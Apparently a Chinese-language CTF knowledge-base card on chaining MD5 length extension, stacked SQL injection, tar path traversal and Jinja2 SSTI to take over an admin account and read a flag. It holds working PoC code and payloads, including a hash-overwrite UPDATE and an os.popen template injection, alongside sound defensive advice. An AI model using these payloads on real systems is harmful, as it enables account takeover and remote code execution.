---
id: crypto-hash-md5-length-extension-password-forge-admin
title: MD5 长度扩展攻击：已知 key 长度与 md5(secret||password)，伪造 admin 密码哈希接管账户
type: scenario
domain: crypto
path: crypto/hash
technique: md5-length-extension-secret-prefix-password-forge
tags:
- md5
- hash
- length-extension
- secret-prefix
- mac-forgery
- sqli
- password-reset
- jinja2
- tar-slip
- ssti
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V156
  verified_at: '2026-11-06T07:45:15+08:00'
  notes: 已对照原文与图3核对：md5(secret_key||password)、key长度16、SQLi把自身密码哈希搬到email后/info泄露、attack_md5(h_leak,16+len(pass_raw),_privesc)长度扩展、伪造哈希写admin、hex编码登录、tar ../templates/info.html目录穿越覆盖模板、Jinja2 os.popen(cat /flag)读flag，均与原文脚本一致。未验证点：未复跑原文exp（图中hash_ext_attack为示例test/6字节key，非本题实际哈希）；CTF题无组件版本，未设置versions；frontmatter无sources/source_url。
url: /docs/crypto/hash/crypto-hash-md5-length-extension-password-forge-admin/
draft: false
kb_aliases:
- Fisafopil
- MD5 长度扩展
- hash length extension
- HashPump
- md5(secret_key||input)
- 密码哈希伪造
- SQLi 泄露哈希
- tar 模板覆盖 SSTI
---

## 一句话结论

服务端用 `md5(secret_key || password)` 存储密码，且密钥长度固定为 16 字节；攻击者先通过 email 处的堆叠 SQL 注入把自己账户的密码哈希泄露出来，再对已知哈希做 MD5 长度扩展，伪造出 `md5(secret_key || 原密码 || MD5 padding || 后缀)` 并写回 admin 的密码哈希，最后用“原密码 + padding + 后缀”登录 admin；登录后还可借 `/admin/restore` 的 tar 目录穿越覆盖 Jinja2 模板，用 SSTI 执行命令读 flag。

## 原理

- **secret-prefix MAC**：服务端计算 `md5(secret_key || password)`，把 32 位十六进制摘要存入数据库；验证时重新计算并比较。secret_key 是固定前缀，长度 16 字节（题目附件给出），攻击者不知道其内容。
- **MD5 的 Merkle-Damgård 结构**：MD5 把消息按 64 字节分组，用 128 位内部状态迭代压缩；最终摘要就是处理完整个消息后的内部状态。给定某个消息的摘要，攻击者可以把该摘要当作初始状态，继续压缩新的分组，得到“原消息 + padding + 新数据”的摘要，而不需要知道原消息的前缀。
- **padding 的构造**：MD5 在消息末尾追加 `0x80`、若干 `0x00`，最后 8 字节是原消息长度（比特数，小端）。长度扩展时必须按原消息长度 `len(secret_key) + len(original_password)` 生成 padding；伪造后的消息是 `original_password || padding || suffix`，其摘要等于 `md5(secret_key || original_password || padding || suffix)`。
- **为什么能接管 admin**：攻击者先用自己的账户获得一个已知明文/摘要对（密码已知，摘要通过 SQLi 泄露）；对该摘要做长度扩展得到伪造摘要；再用 SQLi 把 admin 的密码哈希改成伪造摘要。登录时提交 `original_password || padding || suffix`，服务端计算 `md5(secret_key || 该字节串)`，正好等于伪造摘要，认证通过。
- **为什么不是 HMAC**：HMAC 有内层/外层两次哈希和密钥派生，简单的长度扩展不能直接套用；`md5(secret||msg)` 这种“密钥前缀 + 消息”的自制 MAC 才是本攻击的适用对象。
- **SQLi 的两步作用**：email 字段被拼进 `UPDATE users SET ...`，形成堆叠查询。第一步 `UPDATE users SET email=(SELECT password FROM users WHERE username='自己')` 把自己的密码哈希搬到 email，`/info` 页面显示邮箱时泄露哈希；第二步 `UPDATE users SET password='<forged>' WHERE username='admin'` 把 admin 哈希替换掉。没有 SQLi 就必须有其它泄露/写入哈希的途径。
- **登录后的 tar 目录穿越**：`/admin/restore` 接受 tar 并解压，条目名 `../templates/info.html` 未做规范化，直接写到模板目录，覆盖 `info.html`。模板内容为 Jinja2 SSTI，`/info` 渲染时执行 `os.popen("cat /flag")`，完成 RCE。
- **Hex 编码细节**：原题注册/登录时把 username、password 做十六进制编码后再提交；SQLi 注入的 username 也要用 `binascii.hexlify` 处理。具体编码需按目标实现调整。

## 触发条件

- 密码存储使用 `md5(secret_key || password)` 之类的 secret-prefix 构造，而不是 HMAC/bcrypt/Argon2；secret_key 长度已知（或可爆破）。
- 攻击者能获得某个已知密码对应的合法摘要（SQLi、日志、信息泄露等），并能把伪造摘要写回目标账户（SQLi 堆叠 UPDATE、密码重置接口等）。
- 目标存在 admin 账户，登录逻辑只比较 `md5(secret_key||输入)` 与存储哈希。
- 若要继续 RCE：admin 有 tar 恢复/上传功能，解压路径可穿越，且模板文件可写、Jinja2 会重新加载模板。
- 目标允许堆叠 SQL 语句（PDO/MySQL 等驱动支持多语句）或至少允许子查询/UPDATE。

## 利用步骤

1. 注册普通用户（用户名/密码按目标要求做 hex 编码），登录。
2. 在 `/edit-profile` 的 email 参数注入：`a@b.com'; UPDATE users SET email=(SELECT password FROM users WHERE username='<自己>') WHERE username='<自己>'; --`。
3. 访问 `/info`，从邮箱字段读取 32 位十六进制摘要 `h_leak`；同时确认密码原文字节 `pass_raw` 和 key 长度 16。
4. 计算 `orig_len = 16 + len(pass_raw)`；生成 MD5 padding；用 `h_leak` 作为初始状态，对 `suffix + padding` 继续压缩，得到 `forged_h` 和伪造密码字节串 `pass_raw + padding + suffix`（示例 suffix 为 `_privesc`）。
5. 再次在 email 注入：`x@y.com'; UPDATE users SET password='<forged_h>' WHERE username='admin'; --`。
6. 以 `admin` / `pass_raw + padding + suffix`（按目标 hex 编码）登录，获得 admin 会话。
7. 构造 tar：条目 `../templates/info.html`，内容为 `{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag").read() }}`；通过 `/admin/restore` 上传。
8. 访问 `/info` 触发模板渲染，命令执行并回显 flag。

## PoC

长度扩展核心（原文脚本实现了 MD5 压缩函数，也可直接用 HashPump/hash_extender）：

```python
import struct, binascii

def md5_pad(n):
    # n = len(secret_key) + len(original_password)
    return b"\x80" + b"\x00" * ((55 - n) % 64) + struct.pack("<Q", n * 8)

# 已知：pass_raw（原密码字节）、h_leak（md5(secret||pass_raw) 的 32 位 hex）
# 目标：伪造 md5(secret || pass_raw || pad || suffix)
forged_h, forged_payload = attack_md5(h_leak, 16 + len(pass_raw), b"_privesc")
forged_password = pass_raw + forged_payload   # 登录时提交这个字节串
```

SQLi 关键语句：

```sql
-- 1) 把自己的密码哈希搬到 email，随后 /info 泄露
a@b.com'; UPDATE users SET email=(SELECT password FROM users WHERE username='<self>') WHERE username='<self>'; --

-- 2) 把 admin 的密码哈希改成伪造值
x@y.com'; UPDATE users SET password='<forged_h>' WHERE username='admin'; --
```

tar 覆盖模板（Python 构造，内存中完成）：

```python
import io, tarfile
shell = '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cat /flag").read() }}'
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as tar:
    info = tarfile.TarInfo(name="../templates/info.html")
    data = f"<html><body>{shell}</body></html>".encode()
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))
buf.seek(0)
# POST /admin/restore  files={"restore_file": ("patch.tar", buf, "application/x-tar")}
```

原文在目标上完成并回显 flag；本卡不执行 PoC。`attack_md5` 的实现可用现成工具替代，关键是 `orig_len` 必须等于 key 长度加原密码长度。

## 变体与关联

- **工具替代**：HashPump、hash_extender、`hashpumpy` 都可直接生成伪造摘要与 payload；只需提供已知摘要、原消息长度、后缀。
- **算法变体**：SHA-1/SHA-256 等 Merkle-Damgård 哈希同样受长度扩展影响；SHA-3/BLAKE2 等海绵结构不受影响；HMAC 不受影响。
- **key 长度未知**：可对常见长度（8/16/24/32）逐一尝试，或通过响应差异/错误信息推断；本卡题目明确为 16。
- **SQLi 变体**：若不能堆叠查询，可用子查询/UNION 读出哈希；写 admin 哈希可能需要其它原语（密码重置、越权更新）。
- **tar 变体**：`../` 目录穿越可换成绝对路径、符号链接、硬链接；模板覆盖也可换成覆盖静态文件/配置。
- **与其他哈希卡区分**：MD5 碰撞（相同前缀/不同消息）不等于长度扩展；长度扩展不需要找到碰撞，只需要已知摘要和原消息长度。
- 关联：[[crypto-hash-md5-three-way-collision-nested-fastcoll]]（MD5 碰撞）、[[crypto-hash-md5-digest-strcmp-nullbyte-truncation]]（摘要比较缺陷）、[[web-generic-file-upload-zipslip-template-overwrite-context-variable-leak]]（Zip Slip 模板覆盖）、[[web-python-ssti-jinja2-flask-globals-rce]]（Jinja2 RCE）。

## 检测与防御

- **密码存储**：使用 bcrypt/Argon2/scrypt 或至少 HMAC-SHA256；不要用 `md5(secret || password)` 这种自制 MAC；每个用户独立 salt；使用常量时间比较。
- **SQLi**：所有 SQL 使用参数化查询/预编译语句；数据库账号最小权限，禁止堆叠语句；对 email 等字段做类型/格式校验。
- **tar 解压**：解压前对每个条目做路径规范化，拒绝绝对路径和 `..`；解压到临时目录后再移动到目标；不要以高权限解压到模板/代码目录。
- **模板**：Jinja2 使用 `SandboxedEnvironment`，模板目录只读；不要让上传/恢复功能写入模板目录；对模板渲染做完整性校验。
- **检测**：数据库中出现 `md5(secret||...)` 形式的密码；SQLi 特征（`UPDATE users SET password`、`--`、堆叠语句）；tar 条目含 `../` 或绝对路径；模板文件被上传接口修改；`os.popen`/`__globals__` 出现在模板中。
- **应急**：一旦怀疑数据库泄露，立即轮换 secret_key 并强制所有用户重置密码；长度扩展只影响 secret-prefix 构造，轮换 key 后旧摘要失效。
